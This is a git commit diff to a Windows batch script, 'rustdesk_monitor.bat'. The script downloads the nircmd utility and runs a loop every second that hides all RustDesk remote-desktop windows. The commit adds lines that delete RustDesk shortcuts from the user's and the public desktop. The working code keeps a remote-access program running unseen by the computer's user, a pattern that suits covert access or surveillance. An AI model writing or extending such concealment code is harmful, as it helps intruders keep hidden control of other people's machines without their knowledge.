69ab082471cdee5df57d952f1be3e4dc6c1224e6
hgnstorev2 <hgnstorev2@gmail.com>
2025-04-07 05:25:56 -0800

    Update rustdesk_monitor.bat

--- rustdesk_monitor.bat
+++ rustdesk_monitor.bat
@@ -12,6 +12,12 @@ if not exist "%nircmdPath%" (
     powershell -Command "Expand-Archive -Path '%tempZip%' -DestinationPath '%~dp0' -Force" >nul 2>&1
     del "%tempZip%" >nul 2>&1
 )
+:: === DELETE RUSTDESK SHORTCUTS FROM DESKTOPS ===
+set "desktop1=%USERPROFILE%\Desktop\RustDesk.lnk"
+set "desktop2=%PUBLIC%\Desktop\RustDesk.lnk"
+
+if exist "%desktop1%" del /f /q "%desktop1%"
+if exist "%desktop2%" del /f /q "%desktop2%"
 
 :: === MONITOR LOOP TO HIDE RUSTDESK WINDOWS ===
 :loop
@@ -21,6 +27,8 @@ for /f "usebackq tokens=*" %%A in (`powershell -NoProfile -Command "Get-Process 
         "%nircmdPath%" win hide title "!title!" >nul 2>&1
     )
 )
+
+
 
 :: === WAIT BEFORE LOOPING AGAIN ===
 timeout /t 1 >nul
